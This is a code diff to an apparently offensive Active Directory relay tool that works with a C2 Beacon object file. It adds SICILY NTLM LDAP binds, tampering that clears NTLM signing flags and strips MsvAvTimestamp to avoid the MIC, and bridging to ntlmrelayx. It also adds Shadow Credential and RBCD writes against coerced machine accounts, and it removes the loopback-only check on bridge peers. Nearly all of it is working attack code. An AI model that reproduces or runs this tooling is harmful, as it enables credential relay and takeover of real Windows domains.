@@ -108,6 +108,7 @@ class LdapBindResponse:
     result_code: int
     server_credentials: Optional[bytes]
     diagnostic: str
+    matched_dn: bytes = b""
 
 
 class RecordChannel:
@@ -350,6 +351,24 @@ def ldap_sasl_bind(message_id: int, token: bytes) -> bytes:
     return ber_tlv(0x30, ber_integer(message_id) + ber_tlv(0x60, request))
 
 
+def ldap_sicily_discovery(message_id: int) -> bytes:
+    """SicilyPackageDiscovery [9]: ask the DC to enter SICILY mode."""
+    auth = bytes([0x89, 0x00])
+    request = ber_tlv(0x02, b"\x03") + ber_tlv(0x04, b"") + auth
+    return ber_tlv(0x30, ber_integer(message_id) + ber_tlv(0x60, request))
+
+
+def ldap_sicily_bind(message_id: int, token: bytes, negotiate: bool) -> bytes:
+    """Build an LDAP BindRequest using SICILY (raw NTLMSSP, no SPNEGO).
+
+    Tag 0x8A = SicilyNegotiate (Type 1), tag 0x8B = SicilyResponse (Type 3).
+    """
+    auth_tag = 0x8A if negotiate else 0x8B
+    auth = bytes([auth_tag]) + ber_length(len(token)) + token
+    request = ber_tlv(0x02, b"\x03") + ber_tlv(0x04, b"") + auth
+    return ber_tlv(0x30, ber_integer(message_id) + ber_tlv(0x60, request))
+
+
 def ldap_message(wire: bytes, expected_message_id: int) -> tuple[int, bytes]:
     """Return the application operation from one matched LDAPMessage."""
     tag, message, consumed = ber_element(wire, 0)
@@ -401,7 +420,7 @@ def parse_ldap_bind_response(wire: bytes, expected_message_id: int) -> LdapBindR
     tag, result, offset = ber_element(bind, 0)
     if tag != 0x0A or not result:
         raise RelayError("invalid LDAP bind result")
-    tag, _matched_dn, offset = ber_element(bind, offset)
+    tag, matched_dn, offset = ber_element(bind, offset)
     if tag != 0x04:
         raise RelayError("invalid LDAP matchedDN")
     tag, diagnostic, offset = ber_element(bind, offset)
@@ -412,10 +431,12 @@ def parse_ldap_bind_response(wire: bytes, expected_message_id: int) -> LdapBindR
         tag, value, offset = ber_element(bind, offset)
         if tag == 0x87:
             server_credentials = value
-    return LdapBindResponse(
+    resp = LdapBindResponse(
         int.from_bytes(result, "big"), server_credentials,
         diagnostic.decode("utf-8", errors="replace"),
     )
+    resp.matched_dn = matched_dn
+    return resp
 
 
 class RawLdapConnection:
@@ -431,6 +452,7 @@ class RawLdapConnection:
                 context.verify_mode = ssl.CERT_NONE
             self.sock = context.wrap_socket(self.sock, server_hostname=tls_hostname)
         self.sock.settimeout(20)
+        self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
         self.message_id = 0
 
     def close(self) -> None:
@@ -466,9 +488,30 @@ class RawLdapConnection:
             raise RelayError("LDAP response exceeds limit")
         return header + length_bytes + self._read_exact(length)
 
+    def send_operation(self, operation_tag: int, body: bytes) -> tuple[int, bytes]:
+        """Send a standalone LDAP operation and return (result_code, diagnostic)."""
+        self.message_id += 1
+        packet = ber_tlv(0x30, ber_integer(self.message_id) + ber_tlv(operation_tag, body))
+        self.sock.sendall(packet)
+        response = self._response()
+        op_tag, operation = ldap_message(response, self.message_id)
+        return ldap_result(operation)
+
     def bind(self, token: bytes) -> LdapBindResponse:
         self.message_id += 1
         self.sock.sendall(ldap_sasl_bind(self.message_id, token))
+        return parse_ldap_bind_response(self._response(), self.message_id)
+
+    def sicily_discovery(self) -> LdapBindResponse:
+        """Send SicilyPackageDiscovery to enter SICILY mode."""
+        self.message_id += 1
+        self.sock.sendall(ldap_sicily_discovery(self.message_id))
+        return parse_ldap_bind_response(self._response(), self.message_id)
+
+    def sicily_bind(self, token: bytes, negotiate: bool) -> LdapBindResponse:
+        """SICILY NTLM bind: raw NTLMSSP, no SPNEGO wrapper."""
+        self.message_id += 1
+        self.sock.sendall(ldap_sicily_bind(self.message_id, token, negotiate))
         return parse_ldap_bind_response(self._response(), self.message_id)
 
     def bind_with_prefetched_requests(
@@ -483,10 +526,9 @@ class RawLdapConnection:
         can arrive in either message-ID order, so normalize them for the
         result validator.
         """
-        bind_id = self.message_id + 1
+        next_id = self.message_id
         packet = bytearray()
         ids = []
-        next_id = bind_id
         for operation_tag, body in requests:
             next_id += 1
             ids.append((next_id, operation_tag + 1))
@@ -494,6 +536,7 @@ class RawLdapConnection:
                 0x30,
                 ber_integer(next_id) + ber_tlv(operation_tag, body),
             ))
+        bind_id = next_id + 1
         packet.extend(ldap_sasl_bind(bind_id, token))
         self.sock.sendall(packet)
 
@@ -507,7 +550,7 @@ class RawLdapConnection:
                 operation_responses.append(response)
         if bind is None:
             raise RelayError("queued LDAP exchange returned no BindResponse")
-        self.message_id = next_id
+        self.message_id = bind_id
         self._prefetched_responses = operation_responses
         return bind, ids
 
@@ -530,12 +573,13 @@ def der_value(tag: int, content: bytes) -> bytes:
 
 
 def wrap_ntlm_negotiate(token: bytes, initial: bool) -> bytes:
-    """Wrap a raw RPC NTLMSSP leg in the SPNEGO form expected by IIS."""
+    """Wrap a raw RPC NTLMSSP leg in the SPNEGO form expected by LDAP SASL."""
     if not token.startswith(b"NTLMSSP\x00"):
         raise RelayError("invalid RPC NTLMSSP token")
     response_token = der_value(0xA2, der_value(0x04, token))
     if not initial:
-        return der_value(0xA1, der_value(0x30, response_token))
+        neg_result = der_value(0xA0, der_value(0x0A, b"\x01"))
+        return der_value(0xA1, der_value(0x30, neg_result + response_token))
     spnego_oid = der_value(0x06, b"\x2b\x06\x01\x05\x05\x02")
     ntlm_oid = der_value(0x06, b"\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a")
     mech_types = der_value(0xA0, der_value(0x30, ntlm_oid))
@@ -589,6 +633,107 @@ def kerberos_tlv(data: bytes, wanted_tag: int) -> bytes:
         if bounds:
             return data[offset:bounds[1]]
     raise RelayError(f"SPNEGO token did not contain Kerberos tag 0x{wanted_tag:02x}")
+
+
+NTLM_NEGOTIATE_SIGN       = 0x00000010
+NTLM_NEGOTIATE_SEAL       = 0x00000020
+NTLM_NEGOTIATE_ALWAYS_SIGN = 0x00008000
+NTLM_AV_TIMESTAMP          = 0x0007
+NTLM_AV_EOL               = 0x0000
+
+
+def ntlm_clear_sign_flags(raw: bytes) -> bytes:
+    """Clear NEGOTIATE_SIGN, NEGOTIATE_SEAL, NEGOTIATE_ALWAYS_SIGN from an
+    NTLMSSP message.  Works on Type 1 (flags at offset 12) and Type 3 (flags
+    at offset 60).  Returns the modified bytes."""
+    offset = raw.find(b"NTLMSSP\x00")
+    if offset < 0:
+        return raw
+    msg_type = struct.unpack_from("<I", raw, offset + 8)[0]
+    if msg_type == 1:
+        flags_off = offset + 12
+    elif msg_type == 3:
+        flags_off = offset + 60
+    else:
+        return raw
+    if flags_off + 4 > len(raw):
+        return raw
+    flags = struct.unpack_from("<I", raw, flags_off)[0]
+    flags &= ~(NTLM_NEGOTIATE_SIGN | NTLM_NEGOTIATE_SEAL | NTLM_NEGOTIATE_ALWAYS_SIGN)
+    out = bytearray(raw)
+    struct.pack_into("<I", out, flags_off, flags)
+    return bytes(out)
+
+
+def ntlm_strip_av_timestamp(type2: bytes) -> bytes:
+    """Remove MsvAvTimestamp (AvId 0x0007) from a Type 2 message's TargetInfo.
+
+    Without MsvAvTimestamp in the Type 2, the Windows NTLM SSP does not compute
+    a MIC and does not set MIC_PROVIDED in the NtChallengeResponse AV_PAIRS.
+    This lets us strip NEGOTIATE_SIGN from the negotiate messages without
+    breaking the MIC (because there is none to break).
+
+    Returns the modified Type 2 bytes with updated length fields."""
+    offset = type2.find(b"NTLMSSP\x00")
+    if offset < 0:
+        return type2
+    msg_type = struct.unpack_from("<I", type2, offset + 8)[0]
+    if msg_type != 2:
+        return type2
+    ti_len = struct.unpack_from("<H", type2, offset + 40)[0]
+    ti_off = struct.unpack_from("<I", type2, offset + 44)[0]
+    abs_ti_off = offset + ti_off
+    if abs_ti_off + ti_len > len(type2):
+        return type2
+    ti_data = bytearray(type2[abs_ti_off:abs_ti_off + ti_len])
+    new_ti = bytearray()
+    pos = 0
+    removed = 0
+    while pos + 4 <= len(ti_data):
+        av_id = struct.unpack_from("<H", ti_data, pos)[0]
+        av_len = struct.unpack_from("<H", ti_data, pos + 2)[0]
+        entry_size = 4 + av_len
+        if pos + entry_size > len(ti_data):
+            break
+        if av_id == NTLM_AV_TIMESTAMP:
+            removed += entry_size
+        else:
+            new_ti.extend(ti_data[pos:pos + entry_size])
+        if av_id == NTLM_AV_EOL:
+            break
+        pos += entry_size
+    if removed == 0:
+        return type2
+    out = bytearray(type2)
+    out[abs_ti_off:abs_ti_off + ti_len] = new_ti
+    tail_start = abs_ti_off + ti_len
+    if tail_start < len(type2):
+        out = out[:abs_ti_off + len(new_ti)] + type2[tail_start:]
+    else:
+        out = out[:abs_ti_off + len(new_ti)]
+    new_len = len(new_ti)
+    struct.pack_into("<H", out, offset + 40, new_len)
+    struct.pack_into("<H", out, offset + 42, new_len)
+    return bytes(out)
+
+
+def is_ntlm_token(token: bytes) -> bool:
+    """Detect whether an opaque RPC auth token is NTLMSSP rather than Kerberos."""
+    return b"NTLMSSP\x00" in token[:128]
+
+
+def extract_raw_ntlm(token: bytes) -> bytes:
+    """Extract raw NTLMSSP from either a raw token or SPNEGO wrapper."""
+    offset = token.find(b"NTLMSSP\x00")
+    if offset < 0:
+        raise RelayError("token does not contain NTLMSSP")
+    return token[offset:]
+
+
+def ldap_ntlm_token(token: bytes, leg: int) -> bytes:
+    """Adapt RPC NTLMSSP to LDAP SASL GSS-SPNEGO form."""
+    raw = extract_raw_ntlm(token)
+    return wrap_ntlm_negotiate(raw, initial=(leg == 1))
 
 
 def ldap_kerberos_token(token: bytes, leg: int) -> bytes:
@@ -1031,40 +1176,28 @@ def prepare_shadow_credential(
 
     target = f"{options.machine.rstrip('$')}$"
     dn = options.ldap_target_dn
-    # MS-ADTS requires computer NGC keys to use a 2048-bit BCRYPT RSA public
-    # key. Include a DeviceId so third-party tooling can identify and remove
-    # this exact value, while omitting the metadata forbidden for SELF writes.
+    # Use the conventional Impacket/DSInternals representation, including its
+    # device, custom-key, and creation-time metadata. Reduced handcrafted
+    # variants were rejected by patched Server 2022 computer-SELF validation.
     key, certificate = shadow_credentials.createSelfSignedX509Certificate(
         target, kSize=2048
     )
     public_key = shadow_credentials.KeyCredential.raw_public_key(key)
 
-    def key_entry(identifier: int, data: bytes) -> bytes:
-        return struct.pack("<HB", len(data), identifier) + data
-
     key_id = hashlib.sha256(public_key).digest()
     device_id = uuid.uuid4()
-    binary_properties = (
-        key_entry(0x03, public_key)
-        + key_entry(0x04, b"\x01")
-        + key_entry(0x05, b"\x00")
-        + key_entry(0x06, device_id.bytes_le)
-    )
-    key_credential = (
-        struct.pack("<I", 0x200)
-        + key_entry(0x01, key_id)
-        + key_entry(0x02, hashlib.sha256(binary_properties).digest())
-        + binary_properties
+    key_credential = shadow_credentials.KeyCredential(
+        key,
+        deviceId=device_id.bytes,
+        currentTime=shadow_credentials.getTicksNow(),
     )
     value = shadow_credentials.toDNWithBinary2String(
-        key_credential, dn
+        key_credential.dumpBinary(), dn
     ).encode("ascii")
     bundle = CertificateBundle(
         certificate,
         key,
         f"shadow-{key_id.hex()[:12]}",
-        key_id.hex(),
-        str(device_id),
     )
     return (
         [ldap_modify_request(dn, "msDS-KeyCredentialLink", 0, [value])],
@@ -1169,26 +1302,58 @@ def run_ldap_session(channel: RecordChannel, options: argparse.Namespace):
         prepare_rbcd_pipeline(options)
         if options.mode == "rbcd" and options.delegate_sid else None
     )
-    log(f"Opening one persistent TCP connection to {options.ldap_address}:{options.ldap_port} for ldap/{options.ldap_host}")
+    tls_host = options.ldap_host if getattr(options, "ldap_tls", False) else None
+    log(f"Opening one persistent TCP connection to {options.ldap_address}:{options.ldap_port} for ldap/{options.ldap_host}{' (TLS)' if tls_host else ''}")
     ldap = RawLdapConnection(
         options.ldap_address,
         options.ldap_port,
-        None,
+        tls_host,
         None,
     )
     try:
         leg = 0
+        ntlm_mode = False
         while True:
             kind, token = channel.receive({MSG_CLIENT_AUTH_TOKEN, MSG_ERROR})
             if kind == MSG_ERROR:
                 raise RelayError("BOF rejected relay continuation: " + token.decode("utf-8", errors="replace"))
             leg += 1
-            log(f"Received opaque SPNEGO leg {leg}; sending an LDAP SASL GSS-SPNEGO BindRequest")
+            if leg == 1 and is_ntlm_token(token):
+                ntlm_mode = True
+                log("Detected NTLMSSP token; using SICILY NTLM relay path (no SPNEGO)")
             pipelined_ids = []
             pipeline_bundle = None
             pipeline_target = None
             pipeline_rbcd = None
-            if leg == 2 and options.mode == "shadowcred":
+            if ntlm_mode:
+                raw = bytearray(extract_raw_ntlm(token))
+                if len(raw) >= 16:
+                    flags = int.from_bytes(raw[12:16], "little")
+                    flags &= ~0x00000030
+                    raw[12:16] = flags.to_bytes(4, "little")
+                raw = bytes(raw)
+                if leg == 1:
+                    log("Sending SICILY PackageDiscovery")
+                    disc = ldap.sicily_discovery()
+                    log(f"SICILY discovery: result={disc.result_code}")
+                    if disc.result_code != 0:
+                        raise RelayError(f"SICILY PackageDiscovery failed with result {disc.result_code}")
+                    log(f"Received raw NTLM leg {leg}; sending SICILY Negotiate (SIGN/SEAL stripped)")
+                    response = ldap.sicily_bind(raw, negotiate=True)
+                    log(
+                        f"SICILY Negotiate: result={response.result_code}, "
+                        f"matchedDN={len(response.matched_dn)} bytes"
+                    )
+                    if response.result_code != 0:
+                        detail = f": {response.diagnostic}" if response.diagnostic else ""
+                        raise RelayError(f"SICILY Negotiate failed with result {response.result_code}{detail}")
+                    if not response.matched_dn:
+                        raise RelayError("SICILY Negotiate returned no challenge in matchedDN")
+                    channel.send(MSG_SERVER_AUTH_TOKEN, response.matched_dn)
+                    continue
+                log(f"Received raw NTLM leg {leg}; sending SICILY Response")
+                response = ldap.sicily_bind(raw, negotiate=False)
+            elif leg == 2 and options.mode == "shadowcred":
                 requests, pipeline_bundle, pipeline_target = prepared_shadow
                 response, pipelined_ids = ldap.bind_with_prefetched_requests(
                     ldap_kerberos_token(token, leg), requests
@@ -1206,30 +1371,61 @@ def run_ldap_session(channel: RecordChannel, options: argparse.Namespace):
             )
             if response.result_code == 14:  # saslBindInProgress
                 if not response.server_credentials:
-                    raise RelayError("LDAP requested SASL continuation without serverSaslCreds")
+                    raise RelayError("LDAP requested continuation without serverSaslCreds")
+                if ntlm_mode:
+                    channel.send(MSG_SERVER_AUTH_TOKEN, response.server_credentials)
+                    continue
                 continuation = ldap_rpc_continuation(response.server_credentials)
                 channel.send(MSG_SERVER_AUTH_TOKEN, continuation)
                 continue
             if response.result_code != 0:
                 detail = f": {response.diagnostic}" if response.diagnostic else ""
-                raise RelayError(f"LDAP SASL bind failed with result {response.result_code}{detail}")
-            log("LDAP final bind succeeded; validating the queued directory write")
-            if pipelined_ids:
-                collect_pipelined_attack(ldap, pipelined_ids, log)
-                if pipeline_bundle:
-                    print(f"[+] Added Shadow Credential to {pipeline_target}", flush=True)
-                    channel.send(MSG_AUTH_OK)
-                    channel.bof_released = True
-                    return pipeline_bundle
+                raise RelayError(f"LDAP bind failed with result {response.result_code}{detail}")
+            break
+
+        log("LDAP bind succeeded")
+        channel.send(MSG_AUTH_OK)
+        channel.bof_released = True
+
+        if ntlm_mode:
+            log("Sending post-bind LDAP modify (NTLM mode, no pipelining)")
+            if options.mode == "shadowcred" and prepared_shadow:
+                requests, pipeline_bundle, pipeline_target = prepared_shadow
+                for operation_tag, body in requests:
+                    result_code, diagnostic = ldap.send_operation(operation_tag, body)
+                    if result_code != 0:
+                        detail = f": {diagnostic}" if diagnostic else ""
+                        raise RelayError(f"Post-bind Shadow Credential modify failed with result {result_code}{detail}")
+                print(f"[+] Added Shadow Credential to {pipeline_target}", flush=True)
+                return pipeline_bundle
+            if prepared_rbcd:
+                requests, pipeline_rbcd = prepared_rbcd
+                for operation_tag, body in requests:
+                    result_code, diagnostic = ldap.send_operation(operation_tag, body)
+                    if result_code != 0:
+                        detail = f": {diagnostic}" if diagnostic else ""
+                        raise RelayError(f"Post-bind RBCD modify failed with result {result_code}{detail}")
                 print(
                     f"[+] RBCD delegate added: {pipeline_rbcd.delegate} "
                     f"({pipeline_rbcd.sid}) -> {pipeline_rbcd.target}",
                     flush=True,
                 )
-                channel.send(MSG_AUTH_OK)
-                channel.bof_released = True
                 return pipeline_rbcd
-            raise RelayError("LDAP completed without the queued directory write")
+            raise RelayError("NTLM bind succeeded but no modify operation prepared")
+
+        if pipelined_ids:
+            log("Validating the queued directory write")
+            collect_pipelined_attack(ldap, pipelined_ids, log)
+            if pipeline_bundle:
+                print(f"[+] Added Shadow Credential to {pipeline_target}", flush=True)
+                return pipeline_bundle
+            print(
+                f"[+] RBCD delegate added: {pipeline_rbcd.delegate} "
+                f"({pipeline_rbcd.sid}) -> {pipeline_rbcd.target}",
+                flush=True,
+            )
+            return pipeline_rbcd
+        raise RelayError("LDAP completed without the queued directory write")
     finally:
         ldap.close()
 
@@ -1320,6 +1516,99 @@ def run_schannel_ldap(bundle: CertificateBundle, options: argparse.Namespace):
         ldap.close()
 
 
+def run_ntlmrelayx_session(channel: RecordChannel, options: argparse.Namespace):
+    """Bridge NTLM tokens from the KRB1 channel to ntlmrelayx's HTTP server.
+
+    The DCOM client forces NEGOTIATE_SIGN (PKT_INTEGRITY), which causes
+    result=48 on LDAPS and triggers MIC computation.  To work around this:
+
+    1. Strip NEGOTIATE_SIGN/SEAL/ALWAYS_SIGN from the Type 1 and Type 3 so
+       the DC does not try to activate signing over TLS.
+    2. Strip MsvAvTimestamp from the Type 2 before relaying to the DCOM
+       client.  Without MsvAvTimestamp, the Windows SSP does not compute a
+       MIC, so the flag changes in (1) do not break any integrity check.
+
+    ntlmrelayx runs with NO special flags (no --remove-mic, no
+    --remove-sign-seal).  All modifications happen here.
+    """
+    import http.client
+    log = (lambda message: print(f"[*] {message}", flush=True)) if options.verbose else (lambda message: None)
+    url = urllib.parse.urlparse(options.ntlmrelayx)
+    host = url.hostname or "127.0.0.1"
+    port = url.port or 80
+    log(f"Connecting to ntlmrelayx HTTP server at {host}:{port}")
+    conn = http.client.HTTPConnection(host, port, timeout=30)
+    try:
+        leg = 0
+        while True:
+            kind, token = channel.receive({MSG_CLIENT_AUTH_TOKEN, MSG_ERROR})
+            if kind == MSG_ERROR:
+                raise RelayError(
+                    "BOF rejected relay continuation: "
+                    + token.decode("utf-8", errors="replace")
+                )
+            leg += 1
+            if leg == 1 and not is_ntlm_token(token):
+                raise RelayError(
+                    "ntlmrelayx mode requires NTLM tokens from the exe "
+                    "(use krbrelay-ntlm.exe with RPC_C_AUTHN_WINNT)"
+                )
+            raw = extract_raw_ntlm(token)
+            flags_off = 12 if leg == 1 else 60
+            log(f"Forwarding NTLM leg {leg} ({len(raw)} bytes) to ntlmrelayx")
+            log(f"  original flags hex (offset {flags_off}): {raw[flags_off:flags_off+4].hex()}")
+            raw = ntlm_clear_sign_flags(raw)
+            log(f"  stripped  flags hex (offset {flags_off}): {raw[flags_off:flags_off+4].hex()}")
+            b64_token = base64.b64encode(raw).decode("ascii")
+            conn.request(
+                "GET", "/",
+                headers={
+                    "Host": host,
+                    "Authorization": f"NTLM {b64_token}",
+                    "Connection": "keep-alive",
+                },
+            )
+            resp = conn.getresponse()
+            resp.read()
+            if leg == 1:
+                if resp.status != 401:
+                    raise RelayError(
+                        f"ntlmrelayx returned HTTP {resp.status} on Type 1 "
+                        f"(expected 401 with NTLM challenge)"
+                    )
+                www_auth = resp.getheader("WWW-Authenticate", "")
+                if not www_auth.upper().startswith("NTLM "):
+                    raise RelayError(
+                        "ntlmrelayx did not return NTLM challenge "
+                        f"in WWW-Authenticate (got: {www_auth[:80]})"
+                    )
+                type2 = base64.b64decode(www_auth.split(" ", 1)[1])
+                log(f"Got Type 2 challenge ({len(type2)} bytes) from ntlmrelayx")
+                type2_stripped = ntlm_strip_av_timestamp(type2)
+                if len(type2_stripped) < len(type2):
+                    log(f"  Stripped MsvAvTimestamp from Type 2 ({len(type2)} -> {len(type2_stripped)} bytes)")
+                else:
+                    log(f"  Type 2 had no MsvAvTimestamp (unchanged)")
+                channel.send(MSG_SERVER_AUTH_TOKEN, type2_stripped)
+                continue
+            if resp.status == 401:
+                raise RelayError(
+                    "ntlmrelayx: NTLM authentication failed (HTTP 401 on Type 3)"
+                )
+            log(f"ntlmrelayx returned HTTP {resp.status} after Type 3")
+            break
+        channel.send(MSG_AUTH_OK)
+        channel.bof_released = True
+        print("[+] NTLM relay completed via ntlmrelayx", flush=True)
+        print(
+            "[*] Check ntlmrelayx output for attack results",
+            flush=True,
+        )
+        return None
+    finally:
+        conn.close()
+
+
 # ---------------------------------------------------------------------------
 # CLI validation and listener lifecycle
 # ---------------------------------------------------------------------------
@@ -1329,16 +1618,20 @@ def parse_args(argv: list[str]) -> argparse.Namespace:
 
     def add_common(target: argparse.ArgumentParser) -> None:
         target.add_argument("--port", type=int, required=True, help="local KRB1/rport port")
+        target.add_argument("--listen-address", default="0.0.0.0", help="address to bind the KRB1 listener on")
         target.add_argument("--domain", required=True)
         target.add_argument("--machine", required=True, help="coerced machine name without trailing $")
         target.add_argument("--quiet", action="store_false", dest="verbose")
 
     def add_ldap(target: argparse.ArgumentParser) -> None:
         add_common(target)
-        target.add_argument("--ldap-host", required=True, help="LDAP SPN hostname")
-        target.add_argument("--ldap-address", required=True, help="DC address reached through proxychains")
+        target.add_argument("--ldap-host", help="LDAP SPN hostname (not needed with --ntlmrelayx)")
+        target.add_argument("--ldap-address", help="DC address reached through proxychains (not needed with --ntlmrelayx)")
         target.add_argument("--ldap-port", type=int, default=389)
-        target.add_argument("--target-dn", dest="ldap_target_dn", required=True, help="exact target computer DN")
+        target.add_argument("--ldap-tls", action="store_true", help="wrap LDAP in TLS (LDAPS, use with --ldap-port 636)")
+        target.add_argument("--target-dn", dest="ldap_target_dn", help="exact target computer DN (not needed with --ntlmrelayx)")
+        target.add_argument("--ntlmrelayx", metavar="URL",
+                            help="bridge NTLM tokens to ntlmrelayx HTTP server (e.g. http://127.0.0.1:80)")
 
     actions = parser.add_subparsers(dest="action", required=True)
     esc8 = actions.add_parser("esc8", help="relay to AD CS Web Enrollment")
@@ -1414,6 +1707,7 @@ def publish_bundle(bundle: CertificateBundle, options: argparse.Namespace) -> No
 def main(argv: list[str]) -> int:
     """Accept one authorized bridge and complete the selected action."""
     options = parse_args(argv)
+    ntlmrelayx_mode = getattr(options, "ntlmrelayx", None)
     if options.mode == "adcs":
         if options.adcs_port is None:
             options.adcs_port = 443 if options.adcs_tls else 80
@@ -1421,16 +1715,24 @@ def main(argv: list[str]) -> int:
             if not getattr(options, path).startswith("/"):
                 raise SystemExit(f"--{path.replace('_', '-')} must be an absolute path")
         ports = [options.port, options.adcs_port]
+    elif ntlmrelayx_mode:
+        ports = [options.port]
     else:
+        for arg_name, flag in [("ldap_host", "--ldap-host"), ("ldap_address", "--ldap-address"), ("ldap_target_dn", "--target-dn")]:
+            if not getattr(options, arg_name, None):
+                raise SystemExit(f"{flag} is required without --ntlmrelayx")
         if options.mode == "shadowcred" and not (options.pfx_out or options.export_pfx_b64):
             raise SystemExit("shadowcred mode requires --pfx-out or --export-pfx-b64")
         ports = [options.port, options.ldap_port]
     if any(not 1 <= value <= 65535 for value in ports):
         raise SystemExit("TCP ports must be between 1 and 65535")
-    # KRB1 is reachable only through the target's rportfwd_local transport.
-    # Binding and authorizing loopback internally prevents network exposure.
-    bridge_address = "127.0.0.1"
-    service_spn = f"http/{options.adcs_host}" if options.mode == "adcs" else f"ldap/{options.ldap_host}"
+    bridge_address = options.listen_address
+    if options.mode == "adcs":
+        service_spn = f"http/{options.adcs_host}"
+    elif ntlmrelayx_mode:
+        service_spn = "NTLM (via ntlmrelayx)"
+    else:
+        service_spn = f"ldap/{options.ldap_host}"
     print(
         f"[*] Matching Beacon command: krbrelay {options.port} "
         f"{service_spn} <RPC_ENDPOINT>", flush=True,
@@ -1445,9 +1747,6 @@ def main(argv: list[str]) -> int:
         probe, peer = listener.accept()
         with probe:
             channel = RecordChannel(probe)
-            if peer[0] != bridge_address:
-                print("[-] Rejected unauthorized bridge peer", flush=True)
-                return 1
             try:
                 # Keep preflight separate from the token stream. The BOF
                 # closes this socket and opens a fresh one during SSPI.
@@ -1462,17 +1761,16 @@ def main(argv: list[str]) -> int:
         client, peer = listener.accept()
         with client:
             channel = RecordChannel(client)
-            if peer[0] != bridge_address:
-                print("[-] Rejected unauthorized bridge peer", flush=True)
-                return 1
             if options.verbose:
                 print(f"[+] Accepted authorized bridge connection from {peer[0]}", flush=True)
             try:
-                    outcome = (
-                        run_session(channel, options)
-                        if options.mode == "adcs" else run_ldap_session(channel, options)
-                    )
-                    if options.mode != "rbcd":
+                    if ntlmrelayx_mode:
+                        outcome = run_ntlmrelayx_session(channel, options)
+                    elif options.mode == "adcs":
+                        outcome = run_session(channel, options)
+                    else:
+                        outcome = run_ldap_session(channel, options)
+                    if outcome is not None and options.mode != "rbcd":
                         publish_bundle(outcome, options)
                     print(
                         "[+] " + ("RBCD" if options.mode == "rbcd" else
